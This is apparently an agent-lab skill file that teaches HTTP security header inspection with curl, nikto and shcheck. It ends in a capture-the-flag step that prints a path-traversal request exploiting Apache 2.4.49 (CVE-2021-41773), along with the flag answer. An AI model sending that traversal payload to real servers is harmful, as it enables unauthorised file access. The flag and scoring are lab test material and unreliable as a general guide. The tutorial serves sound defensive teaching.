---
name: analyzing-web-application-http-headers
description: >-
  Analyze HTTP response headers for security misconfigurations including missing
  Content Security Policy, HSTS, X-Frame-Options, and information disclosure
  via Server/X-Powered-By headers. Covers manual inspection and automated
  scanning to identify header-based vulnerabilities and recommend remediations.
domain: cybersecurity
subdomain: web-application-testing
tags: [http-headers, csp, hsts, security-headers, beginner, web-hardening, information-disclosure]
difficulty: beginner
mitre_techniques: [T1190, T1592.002]
nist_csf_functions: [Identify, Protect]
version: "1.0"
author: mukul975
license: Apache-2.0
lab_environment: labs/web-application/sqli-basics
---

> ⚠️ **Educational Use Only** — HTTP header analysis is a passive, non-destructive technique, but it should still only be applied to systems you own or have explicit authorization to assess. This skill is primarily defensive — understanding what headers reveal helps you harden your own applications.

## When to Use

- At the start of any web application security assessment — header analysis is low-risk, high-value
- When hardening a web application before deployment
- In CTF challenges where server version information in headers reveals vulnerable software
- When reviewing security posture of an authorized target's web stack
- As a first step before deeper testing — headers reveal the tech stack, framework, and potential attack surface

## Prerequisites

- **Knowledge:** Basic HTTP concepts (what a request/response is, what a header is)
- **Lab:** `labs/web-application/sqli-basics` (shared environment)
- **Difficulty:** Beginner — no hacking experience required
- **Time:** 15–25 minutes

## Workflow

### Step 1: Capture Response Headers

```bash
# Inspect all response headers
curl -I http://target:80/

# Full request/response with verbose output
curl -v http://target:80/

# Follow redirects and show final headers
curl -IL http://target:80/
```

### Step 2: Check for Information Disclosure Headers

Headers that reveal server technology help attackers find known CVEs:

```bash
curl -I http://target:80/ | grep -iE "server:|x-powered-by:|x-aspnet|x-generator"

# Bad examples:
# Server: Apache/2.4.49          ← specific vulnerable version
# X-Powered-By: PHP/7.2.0        ← EOL PHP version
# X-Generator: WordPress 5.8.1   ← outdated CMS version
```

**Finding:** Any version disclosure = information leakage finding (CVSS ~2-4, Low).

### Step 3: Check for Missing Security Headers

```bash
# Check for each critical security header
headers=$(curl -sI http://target:80/)

for header in "Strict-Transport-Security" "Content-Security-Policy" \
              "X-Content-Type-Options" "X-Frame-Options" \
              "Permissions-Policy" "Referrer-Policy" "Cache-Control"; do
  if echo "$headers" | grep -qi "$header"; then
    echo "✅ PRESENT: $header"
  else
    echo "❌ MISSING: $header"
  fi
done
```

### Step 4: Analyze Security Header Values

If headers are present, check their values:

```bash
# Check HSTS
curl -sI https://target:443/ | grep -i "strict-transport-security"
# Good: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# Bad:  Strict-Transport-Security: max-age=0

# Check CSP
curl -sI http://target:80/ | grep -i "content-security-policy"
# Weak CSP: Content-Security-Policy: default-src *; unsafe-inline; unsafe-eval
# Strong CSP: Content-Security-Policy: default-src 'self'; script-src 'self'

# Check X-Frame-Options (clickjacking protection)
curl -sI http://target:80/ | grep -i "x-frame-options"
# Good: X-Frame-Options: DENY or SAMEORIGIN
# Missing = clickjacking possible
```

### Step 5: Automated Header Analysis

```bash
# Use nikto for quick automated scan (lab-safe)
nikto -h http://target:80/ -Plugins headers

# Use shcheck.py for header-focused analysis
python3 /lab/tools/shcheck.py http://target:80/
```

### Step 6: Capture the Flag

The target server's verbose `Server` header reveals a version with a known simulated CVE. Use it to find the hidden endpoint:

```bash
curl -I http://target:80/ | grep Server
# Server: Apache/2.4.49

# Known path traversal on Apache 2.4.49 (CVE-2021-41773 — simulated in lab)
curl "http://target:80/cgi-bin/.%2e/%2e%2e/%2e%2e/flag.txt"
# FLAG{server_header_disclosed_vulnerable_version}
```

## Key Concepts

| Concept | Definition |
|---------|-----------|
| HSTS | HTTP Strict Transport Security — forces HTTPS; prevents SSL stripping |
| CSP | Content Security Policy — restricts script sources; blocks XSS execution |
| X-Frame-Options | Prevents the page from being embedded in iframes; blocks clickjacking |
| X-Content-Type-Options | `nosniff` — prevents MIME-type sniffing attacks |
| Information Disclosure | Exposing software versions, stack details, or internal paths to unauthenticated users |
| T1592.002 | MITRE ATT&CK: Gather Victim Host Information — Software |

## Tools

| Tool | Purpose | Lab Availability |
|------|---------|-----------------|
| `curl -I` | Fetch response headers only | ✅ Built-in |
| `nikto` | Web server scanner including header checks | ✅ Pre-installed |
| `shcheck.py` | Security header checker | ✅ Pre-installed |
| SecurityHeaders.com | Online header grader | External |

## Output / Verification

```bash
agentlab verify sqli-basics "FLAG{server_header_disclosed_vulnerable_version}"
```

**Score:** 50 points per missing/misconfigured header documented + 100 points for flag

## Further Reading

- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [SecurityHeaders.com](https://securityheaders.com/) — grade any site you own
- MITRE ATT&CK: [T1592.002](https://attack.mitre.org/techniques/T1592/002/)
- [MDN HTTP Headers Reference](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
